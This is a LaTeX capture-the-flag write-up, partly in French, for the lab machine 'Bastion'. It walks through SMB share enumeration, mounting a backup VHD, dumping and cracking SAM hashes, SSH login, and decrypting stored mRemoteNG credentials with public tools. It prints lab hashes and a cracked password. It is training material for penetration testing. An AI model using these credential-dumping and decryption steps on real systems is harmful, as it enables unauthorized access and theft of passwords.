\chapter{Bastion}
\begin{itemize}
    \item {\bf technics}: vhd mounting, sam dumping 
    \item {\bf Components}: mremoteNG
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX bastion.xml 10.10.10.134
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 12:15 CEST
Nmap scan report for 10.10.10.134
Host is up (0.11s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-09-28T10:16:10
|_  start_date: 2022-09-28T10:14:42
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-28T12:16:11+02:00
|_clock-skew: mean: -39m59s, deviation: 1h09m15s, median: 0s


$ sudo nmap -p- 10.10.10.134
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 12:17 CEST
Nmap scan report for 10.10.10.134
Host is up (0.055s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
$ enum4linux-ng -A 10.10.10.134 -u anonymous -p avdkds

[*] Enumerating shares
[+] Found 4 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
Backups:
  comment: ''
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Backups
[+] Mapping: OK, Listing: OK
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
\end{verbatim}



\begin{verbatim}
$ sudo mount -t cifs -o ro,username=anonymous,password=toto '//10.10.10.134/Backups' tmp
\end{verbatim}


\subsubsection{vhd}
\begin{verbatim}
$ sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd \
    --inspector --ro /mnt -v

C:\Windows\System32\config\SAM

$ secretsdump.py -sam ./SAM -system ./SYSTEM  LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
\end{verbatim}

le pass the hash avec un evil-winrm ne passe pas


\begin{verbatim}
$ hashcat -m 1000  hashes /usr/share/wordlists/passwords/rockyou.txt

26112010952d963c8dc4217daec986d9:bureaulampje


\end{verbatim}
ne passe pas non plus avec le password donc pas d'acces comme cela on va
essayer en ssh

et la ca passe.


\subsection{Privesc}
\begin{verbatim}
# bureaulampje
 ssh l4mpje@10.10.10.134
\end{verbatim}

\subsubsection{mRemoteNG}
mRemoteNG (mremote) is an open source project
(\url{https://github.com/rmcardle/mRemoteNG}) that provides a full-featured,
multi-tab remote connections manager. It currently supports RDP, SSH, Telnet,
VNC, ICA, HTTP/S, rlogin, and raw socket connections. Additionally, It also
provides the means to save connection settings such as hostnames, IP addresses,
protocol, port, and user credentials, in a password protected and encrypted
connections file.

The password can be found at \verb+%appdata%/mRemoteNG+ in a file named
\verb+confCons.xml+. 

It turns out, the master password is just used by the program to determine
whether or not to load in the selected connections file. The stored credentials
are actually encrypted with a static string, not the master password. This
creates a scenario wherein the master password hash can simply be replaced with
a blank password hash, to bypass the master password prompt. Once the
connections file is loaded, the program even has the ability to add additional
“External tools”, which allow for access to the programs variables and memory
space. This allows for simple echo commands to be added to reveal hidden
details about each connection, such as the clear text password.

{\bf Method Using an Offline Decoder}

A modified version of the Metasploit module Ruby code, can be used to get the
clear text passwords from within a protected connections file.

The file can be downloaded from packetstorm
(\url{https://packetstormsecurity.com/files/126309/mRemoteOffPwdsDecrypt.rb.txt})
and run on Kali systems as such:
\begin{verbatim}
ruby mRemoteOffPwdsDecrypt.rb confCons.xml
\end{verbatim}

or
\href{https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py}{mremote\_decrypt.py}

\url{https://hackersvanguard.com/mremoteng-insecure-password-storage/}

content of \verb+C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml+:
\begin{verbatim}
 Username="Administrator" 
 Domain="" 
 Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" 
 Hostname="127.0.0.1"

 Username="L4mpje"
 Domain="" 
 Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" 
 Hostname="192.168.1.75"
\end{verbatim}

{\bf Using the Metasploit Post Module}

\verb+post/windows/gather/credentials/mremote+

\section{Theorie}


